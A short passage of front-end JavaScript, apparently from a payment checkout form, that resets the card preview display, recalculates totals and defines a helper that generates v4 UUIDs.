    document.getElementById('card-expiry-view').textContent = 'MM/AA';
    document.getElementById('card-cvv-view').textContent = '•••';
    detectCardBrand('');
    
    calculateTotals();
  }

  // Helper: Gerar UUID v4
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }
});
